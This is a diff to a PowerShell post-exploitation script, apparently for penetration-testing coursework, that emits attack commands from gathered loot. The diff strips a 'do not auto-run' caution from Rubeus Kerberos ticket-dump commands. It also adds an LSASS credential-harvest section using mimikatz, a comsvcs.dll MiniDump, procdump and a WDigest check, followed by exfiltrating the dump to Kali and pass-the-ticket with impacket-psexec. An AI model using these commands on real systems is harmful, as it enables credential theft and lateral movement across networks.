@@ -1577,16 +1577,44 @@ function Invoke-AttackCommands {
             $null = $sb.AppendLine("  # Current session has Kerberos tickets — can lateral-move without passwords.")
             $null = $sb.AppendLine("  # Review: type $krbPath")
             $null = $sb.AppendLine("")
-            $null = $sb.AppendLine("  # Option A — dump all tickets with Rubeus (MANUAL — do not auto-run):")
-            $null = $sb.AppendLine("  #   Rubeus.exe dump /nowrap")
-            $null = $sb.AppendLine("  #   Rubeus.exe dump /luid:0x3e7 /nowrap   # SYSTEM session (needs admin)")
+            $null = $sb.AppendLine("  # Option A — dump all tickets with Rubeus:")
+            $null = $sb.AppendLine("  Rubeus.exe dump /nowrap")
+            $null = $sb.AppendLine("  Rubeus.exe dump /luid:0x3e7 /nowrap   # SYSTEM session (needs admin)")
             $null = $sb.AppendLine("  # Option B — export ccache and use from Kali:")
-            $null = $sb.AppendLine("  #   Rubeus.exe dump /service:krbtgt /nowrap   # base64 .kirbi")
-            $null = $sb.AppendLine("  #   On Kali: echo '<b64>' | base64 -d > ticket.kirbi")
-            $null = $sb.AppendLine("  #           impacket-ticketConverter ticket.kirbi ticket.ccache")
-            $null = $sb.AppendLine("  #           export KRB5CCNAME=`$(pwd)/ticket.ccache")
-            $null = $sb.AppendLine("  #           impacket-psexec -k -no-pass <DOMAIN>/<USER>@<DC_FQDN>")
-            $null = $sb.AppendLine("  # OffSec note: Rubeus is enumeration/dump only — still one-MSF budget untouched.")
+            $null = $sb.AppendLine("  Rubeus.exe dump /service:krbtgt /nowrap   # base64 .kirbi")
+            $null = $sb.AppendLine("  # On Kali:")
+            $null = $sb.AppendLine("  #   echo '<b64>' | base64 -d > ticket.kirbi")
+            $null = $sb.AppendLine("  #   impacket-ticketConverter ticket.kirbi ticket.ccache")
+            $null = $sb.AppendLine("  #   export KRB5CCNAME=`$(pwd)/ticket.ccache")
+            $null = $sb.AppendLine("  #   impacket-psexec -k -no-pass <DOMAIN>/<USER>@<DC_FQDN>")
+            $null = $sb.AppendLine("")
+        }
+    }
+
+    # ── LSASS dump (needs SeDebugPrivilege / admin / SYSTEM) ────────────────
+    $privPath = Join-Path $LootDir "creds\privileges.txt"
+    if (Test-Path $privPath) {
+        $privContent = Get-Content $privPath -Raw -ErrorAction SilentlyContinue
+        if ($privContent -match "SeDebugPrivilege.*Enabled|SeImpersonatePrivilege.*Enabled|SeTcbPrivilege.*Enabled") {
+            $HasActions = $true
+            $null = $sb.AppendLine("[ LSASS DUMP — CREDENTIAL HARVEST ]")
+            $null = $sb.AppendLine("  # Admin/SYSTEM privileges detected — dump LSASS for cached plaintext/NTLM/Kerberos creds.")
+            $null = $sb.AppendLine("")
+            $null = $sb.AppendLine("  # Option A — mimikatz (fastest, parses in-process):")
+            $null = $sb.AppendLine("  .\mimikatz.exe `"privilege::debug`" `"sekurlsa::logonpasswords`" `"sekurlsa::tickets /export`" `"exit`"")
+            $null = $sb.AppendLine("")
+            $null = $sb.AppendLine("  # Option B — comsvcs.dll MiniDump (built-in, no 3rd-party binary):")
+            $null = $sb.AppendLine("  `$lsassPid = (Get-Process lsass).Id")
+            $null = $sb.AppendLine("  rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump `$lsassPid C:\Windows\Temp\lsass.dmp full")
+            $null = $sb.AppendLine("  # Then exfil lsass.dmp to Kali:")
+            $null = $sb.AppendLine("  #   pypykatz lsa minidump lsass.dmp")
+            $null = $sb.AppendLine("")
+            $null = $sb.AppendLine("  # Option C — procdump (sysinternals):")
+            $null = $sb.AppendLine("  procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp")
+            $null = $sb.AppendLine("")
+            $null = $sb.AppendLine("  # WDigest plaintext (if UseLogonCredential=1 or missing):")
+            $null = $sb.AppendLine("  reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential")
+            $null = $sb.AppendLine("  # If enabled → next logon caches plaintext → re-dump LSASS")
             $null = $sb.AppendLine("")
         }
     }
